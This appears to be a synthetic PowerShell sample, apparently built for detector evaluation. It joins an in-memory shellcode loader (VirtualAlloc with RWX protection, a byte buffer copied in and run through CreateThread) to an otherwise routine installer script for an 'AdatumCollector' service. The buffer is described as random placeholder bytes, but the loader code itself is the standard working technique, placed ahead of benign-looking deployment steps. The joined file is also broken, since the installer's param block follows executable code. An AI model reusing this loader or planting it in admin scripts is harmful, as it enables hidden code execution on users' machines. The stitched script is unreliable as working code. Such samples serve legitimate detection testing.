<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\run.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x1e, 0xde, 0xdc, 0xf0, 0x3a, 0x25, 0x01, 0x6c, 0x12, 0x2a, 0xac, 0x06, 0x2d, 0x1f, 0x5a, 0x78,
    0x71, 0x1f, 0x6a, 0x9f, 0xf7, 0x8e, 0xb4, 0x18, 0x00, 0x76, 0x37, 0x22, 0x16, 0x61, 0x4d, 0xe6,
    0x2b, 0x52, 0x7c, 0x48, 0x36, 0xe2, 0x51, 0x19, 0xde, 0x2a, 0xa9, 0x3f, 0x79, 0xc9, 0x87, 0x88,
    0x8b, 0x90, 0x37, 0x56, 0xe4, 0x54, 0x48, 0x8e, 0xa0, 0x63, 0x02, 0x60, 0xfb, 0x45, 0xb6, 0x0c,
    0x3f, 0xc5, 0xf9, 0x59, 0x39, 0xc6, 0x4c, 0xa3, 0x20, 0xdb, 0x30, 0x3b, 0x37, 0x89, 0xd3, 0x06,
    0x78, 0x06, 0x5c, 0x6a, 0xfd, 0x34, 0xf1, 0x12, 0x80, 0x2f, 0xd9, 0x04, 0xcb, 0xc0, 0xb9, 0x48,
    0xdf, 0x4b, 0x30, 0xfe, 0x63, 0xec, 0xd6, 0x41, 0x58, 0x16, 0x0d, 0x4b, 0x68, 0xcc, 0x95, 0xa0,
    0xb5, 0x7f, 0x83, 0x74, 0x9e, 0x21, 0xc0, 0xad, 0xc5, 0xa1, 0x63, 0x4b, 0xd9, 0xbf, 0x82, 0xa1,
    0x43, 0xab, 0xce, 0x21, 0x01, 0xab, 0x7b, 0x16, 0x4c, 0xf7, 0x90, 0x14, 0x6c, 0x37, 0xf0, 0xfa,
    0x77, 0x42, 0x96, 0x17, 0x03, 0x5b, 0x9d, 0xff, 0xfe, 0xfe, 0x88, 0xdd, 0x79, 0x00, 0x43, 0xc3,
    0xe1, 0xe8, 0xc6, 0xd6, 0x70, 0xfa, 0x13, 0xf2, 0x60, 0x2d, 0x07, 0x01, 0x34, 0xcc, 0x7a, 0x57,
    0x83, 0x33, 0x84, 0x2e, 0x83, 0xd9, 0xad, 0xda, 0xff, 0xb9, 0x0e, 0x85, 0x52, 0x41, 0x56, 0x53,
    0x7f, 0xce, 0xa9, 0x23, 0x30, 0xa9, 0x09, 0xfa, 0xbc, 0xfe, 0x1c, 0xbe, 0xf6, 0x9a, 0xef, 0xb9,
    0x96, 0x16, 0x72, 0x80, 0x0f, 0xc2, 0xc0, 0xef, 0x8e, 0x69, 0x84, 0xdd, 0xf5, 0xd3, 0xda, 0x30,
    0x0e, 0xb6, 0x5e, 0xc0, 0x87, 0x67, 0xdb, 0xdb, 0x21, 0x2f, 0x94, 0x91, 0x65, 0x09, 0x6c, 0xf6,
    0x11, 0xa3, 0x01, 0xfc, 0x3f, 0x92, 0xbd, 0x8a, 0x78, 0xb7, 0x73, 0x1b, 0x8a, 0xf1, 0x56, 0x70,
    0xda, 0x08, 0x11, 0xdc, 0x47, 0xe0, 0x87, 0x0c, 0x72, 0xe2, 0xb4, 0xe2, 0x8e, 0xd8, 0x6b, 0xeb,
    0x98, 0xda, 0x91, 0x04, 0x5b, 0xb5, 0x94, 0x4a, 0x71, 0x1d, 0xe8, 0x7d, 0x56, 0xc9, 0x3e, 0x5b,
    0x0d, 0x1f, 0x09, 0x4d, 0x73, 0xa9, 0x04, 0x80, 0x16, 0xa5, 0x15, 0x94, 0xef, 0x30, 0x10, 0x91,
    0xb1, 0x82, 0xd1, 0x74, 0xe9, 0x4c, 0x7a, 0xe9, 0xb7, 0x89, 0xc5, 0x10, 0xe7, 0x8e, 0x3d, 0xf0,
    0xfd, 0x3b, 0x36, 0xf3, 0xbb, 0xcf, 0xae, 0x15, 0xa8, 0x73, 0x08, 0x89, 0xca, 0x28, 0xad, 0x90,
    0x22, 0xed, 0x41, 0x8f, 0x21, 0x2d, 0xcb, 0xd8, 0x1d, 0xdc, 0xaf, 0xbc, 0x76, 0x9f, 0x5d, 0x04,
    0xc0, 0x2a, 0x90, 0x04, 0x43, 0xec, 0x6d, 0xa7, 0xa2, 0x74, 0x08, 0x25, 0x3f, 0x79, 0x36, 0x7a,
    0x33, 0x74, 0xba, 0x01, 0xc4, 0xdd, 0xe2, 0x13, 0x5f, 0xd5, 0x5a, 0x7c, 0xdb, 0x03, 0x96, 0xb8,
    0xf6, 0x2e, 0xfc, 0x72, 0x78, 0xc9, 0xbd, 0xa1, 0xe8, 0xc6, 0xfd, 0x92, 0xa6, 0x5d, 0x8b, 0x79,
    0x62, 0x44, 0xac, 0xdc, 0x4b, 0x41, 0xce, 0x04, 0xde, 0xfb, 0x36, 0x17, 0xd1, 0x5f, 0x65, 0xe2,
    0x2c, 0x84, 0x12, 0xd5, 0x49, 0x73, 0x6d, 0x5b, 0x1f
)

$ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 2470)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InstallerPath = 'C:\Scripts\packages\AdatumCollector-3.7.4.msi',
    [string]$ServiceName = "AdatumCollector",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 9443,
    [int]$TimeoutSec = 120,
    [string]$LogPath = 'C:\Logs\install-adatumcollector-2024-12-21.log',
    [string]$RuleName = "AdatumCollector Inbound"
)
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$DebugPreference = 'SilentlyContinue'

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}
if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$regPath = 'HKLM:\SOFTWARE\Adatum\AdatumCollector'
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '3.7.4' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "AdatumCollector Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName "AdatumCollector Inbound" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}
$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'AdatumCollector'
    Version   = '3.7.4'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8
$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = "deploy@adatum.com"
$subject = "AdatumCollector 3.7.4 deployed on $env:COMPUTERNAME"

Send-MailMessage -To $MailTo -From 'deploy@adatum.com' -Subject $subject `
    -Body "Installation completed and the service is responding." -SmtpServer "smtp.adatum.com" -Port 25

$stale = Get-ChildItem -Path $env:TEMP -Filter 'adatumcollector-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$agentConfig = Join-Path $env:ProgramData 'AdatumCollector\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'AdatumCollector*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
